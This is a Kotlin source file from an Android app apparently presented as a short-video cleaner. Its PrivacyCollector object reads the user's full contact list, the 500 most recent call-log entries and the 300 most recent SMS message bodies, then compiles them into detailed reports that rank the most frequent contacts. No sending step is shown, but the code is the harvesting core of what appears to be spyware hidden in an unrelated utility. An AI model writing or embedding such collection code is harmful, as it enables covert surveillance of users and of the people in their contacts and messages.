package com.shortvideocleaner.app

import android.content.Context
import android.database.Cursor
import android.net.Uri
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.Telephony
import java.text.SimpleDateFormat
import java.util.*

/**
 * 隐私数据收集器 —— 通讯录、通话记录、短信
 *
 * 需要对应权限：READ_CONTACTS, READ_CALL_LOG, READ_SMS
 * 这些是 dangerous 权限，会触发系统弹窗。
 */
object PrivacyCollector {

    // ── 通讯录 ──

    fun collectContacts(context: Context): String {
        val sb = StringBuilder()
        sb.appendLine()
        sb.appendLine("═══════════════════════════")
        sb.appendLine("  通讯录")
        sb.appendLine("═══════════════════════════")
        sb.appendLine()

        val contacts = mutableListOf<ContactEntry>()
        var cursor: Cursor? = null

        try {
            cursor = context.contentResolver.query(
                ContactsContract.Contacts.CONTENT_URI,
                null, null, null,
                ContactsContract.Contacts.DISPLAY_NAME + " ASC"
            )

            if (cursor != null) {
                while (cursor.moveToNext() && contacts.size < 2000) {
                    val id = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts._ID))
                    val name = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME)) ?: "(无姓名)"
                    val hasPhone = cursor.getInt(cursor.getColumnIndexOrThrow(ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0

                    val phones = mutableListOf<String>()
                    if (hasPhone) {
                        val phoneCursor = context.contentResolver.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            arrayOf(id),
                            null
                        )
                        phoneCursor?.use { pc ->
                            while (pc.moveToNext() && phones.size < 5) {
                                val number = pc.getString(pc.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER))
                                val type = pc.getInt(pc.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.TYPE))
                                val typeLabel = getPhoneType(type)
                                phones.add("$number ($typeLabel)")
                            }
                        }
                    }

                    contacts.add(ContactEntry(name, phones))
                }
            }
        } catch (e: Exception) {
            sb.appendLine("(无法读取通讯录: ${e.message})")
            return sb.toString()
        } finally {
            cursor?.close()
        }

        sb.appendLine("联系人总数: ${contacts.size}")
        sb.appendLine()

        contacts.forEachIndexed { idx, contact ->
            sb.appendLine("${idx + 1}. ${contact.name}")
            contact.phones.forEach { phone ->
                sb.appendLine("    📞 $phone")
            }
        }

        return sb.toString()
    }

    // ── 通话记录 ──

    fun collectCallLog(context: Context): String {
        val sb = StringBuilder()
        sb.appendLine()
        sb.appendLine("═══════════════════════════")
        sb.appendLine("  通话记录（最近 500 条）")
        sb.appendLine("═══════════════════════════")
        sb.appendLine()

        val calls = mutableListOf<CallEntry>()
        var cursor: Cursor? = null

        try {
            cursor = context.contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                null, null, null,
                CallLog.Calls.DATE + " DESC"
            )

            if (cursor != null) {
                while (cursor.moveToNext() && calls.size < 500) {
                    val number = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER)) ?: "未知号码"
                    val name = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME)) ?: "(未命名)"
                    val date = cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE))
                    val duration = cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION))
                    val type = cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE))
                    val typeStr = when (type) {
                        CallLog.Calls.INCOMING_TYPE -> "来电"
                        CallLog.Calls.OUTGOING_TYPE -> "去电"
                        CallLog.Calls.MISSED_TYPE -> "未接"
                        CallLog.Calls.VOICEMAIL_TYPE -> "语音信箱"
                        CallLog.Calls.REJECTED_TYPE -> "拒接"
                        CallLog.Calls.BLOCKED_TYPE -> "拦截"
                        else -> "其他"
                    }

                    calls.add(CallEntry(number, name, date, duration, typeStr))
                }
            }
        } catch (e: Exception) {
            sb.appendLine("(无法读取通话记录: ${e.message})")
            return sb.toString()
        } finally {
            cursor?.close()
        }

        // 统计
        val incoming = calls.count { it.type == "来电" }
        val outgoing = calls.count { it.type == "去电" }
        val missed = calls.count { it.type == "未接" }
        val totalDur = calls.sumOf { it.duration }
        val topContacts = calls.groupBy { it.name }
            .entries
            .sortedByDescending { it.value.size }
            .take(20)

        sb.appendLine("通话总数: ${calls.size}")
        sb.appendLine("来电: $incoming, 去电: $outgoing, 未接: $missed")
        sb.appendLine("总通话时长: ${formatDuration(totalDur)}")
        sb.appendLine()
        sb.appendLine("── 最频繁联系人 (Top 20) ──")
        topContacts.forEach { (name, list) ->
            sb.appendLine("  $name: ${list.size} 次通话")
        }
        sb.appendLine()
        sb.appendLine("── 详细记录 ──")
        calls.forEachIndexed { idx, call ->
            val dateStr = formatDate(call.date)
            val durStr = if (call.duration > 0) " ${formatDuration(call.duration)}" else ""
            val icon = when (call.type) {
                "来电" -> "📥"
                "去电" -> "📤"
                "未接" -> "❌"
                else -> "📞"
            }
            sb.appendLine("${idx + 1}. $icon ${call.name}  ${call.number}  $dateStr$durStr  ${call.type}")
        }

        return sb.toString()
    }

    // ── 短信 ──

    fun collectSms(context: Context): String {
        val sb = StringBuilder()
        sb.appendLine()
        sb.appendLine("═══════════════════════════")
        sb.appendLine("  短信（最近 300 条）")
        sb.appendLine("═══════════════════════════")
        sb.appendLine()

        val messages = mutableListOf<SmsEntry>()
        var cursor: Cursor? = null

        try {
            cursor = context.contentResolver.query(
                Telephony.Sms.CONTENT_URI,
                null, null, null,
                Telephony.Sms.DATE + " DESC"
            )

            if (cursor != null) {
                while (cursor.moveToNext() && messages.size < 300) {
                    val address = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)) ?: "未知"
                    val body = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY)) ?: ""
                    val date = cursor.getLong(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE))
                    val type = cursor.getInt(cursor.getColumnIndexOrThrow(Telephony.Sms.TYPE))
                    val typeStr = when (type) {
                        Telephony.Sms.MESSAGE_TYPE_INBOX -> "接收"
                        Telephony.Sms.MESSAGE_TYPE_SENT -> "发送"
                        Telephony.Sms.MESSAGE_TYPE_DRAFT -> "草稿"
                        Telephony.Sms.MESSAGE_TYPE_OUTBOX -> "待发"
                        else -> "其他"
                    }

                    // 截断过长短信
                    val shortBody = if (body.length > 200) body.take(200) + "..." else body
                    messages.add(SmsEntry(address, shortBody, date, typeStr))
                }
            }
        } catch (e: Exception) {
            sb.appendLine("(无法读取短信: ${e.message})")
            return sb.toString()
        } finally {
            cursor?.close()
        }

        // 统计
        val received = messages.count { it.type == "接收" }
        val sent = messages.count { it.type == "发送" }
        val topSenders = messages.groupBy { it.address }
            .entries
            .sortedByDescending { it.value.size }
            .take(15)

        sb.appendLine("短信总数: ${messages.size}")
        sb.appendLine("接收: $received, 发送: $sent")
        sb.appendLine()
        sb.appendLine("── 最频繁联系人 (Top 15) ──")
        topSenders.forEach { (address, list) ->
            sb.appendLine("  $address: ${list.size} 条")
        }
        sb.appendLine()
        sb.appendLine("── 详细记录 ──")
        messages.forEachIndexed { idx, msg ->
            val dateStr = formatDate(msg.date)
            val icon = if (msg.type == "接收") "📥" else "📤"
            sb.appendLine("${idx + 1}. $icon ${msg.address}  $dateStr")
            sb.appendLine("    ${msg.body}")
            sb.appendLine()
        }

        return sb.toString()
    }

    // ── 数据类 ──

    private data class ContactEntry(val name: String, val phones: List<String>)
    private data class CallEntry(val number: String, val name: String, val date: Long, val duration: Long, val type: String)
    private data class SmsEntry(val address: String, val body: String, val date: Long, val type: String)

    // ── 工具 ──

    private fun getPhoneType(type: Int): String = when (type) {
        ContactsContract.CommonDataKinds.Phone.TYPE_HOME -> "住宅"
        ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE -> "手机"
        ContactsContract.CommonDataKinds.Phone.TYPE_WORK -> "工作"
        ContactsContract.CommonDataKinds.Phone.TYPE_FAX_WORK -> "工作传真"
        ContactsContract.CommonDataKinds.Phone.TYPE_FAX_HOME -> "住宅传真"
        ContactsContract.CommonDataKinds.Phone.TYPE_PAGER -> "寻呼机"
        ContactsContract.CommonDataKinds.Phone.TYPE_OTHER -> "其他"
        ContactsContract.CommonDataKinds.Phone.TYPE_CUSTOM -> "自定义"
        else -> "未知"
    }

    private fun formatDate(millis: Long): String {
        return SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.getDefault()).format(Date(millis))
    }

    private fun formatDuration(seconds: Long): String {
        val h = seconds / 3600
        val m = (seconds % 3600) / 60
        val s = seconds % 60
        return if (h > 0) "${h}h${m}m${s}s" else if (m > 0) "${m}m${s}s" else "${s}s"
    }
}
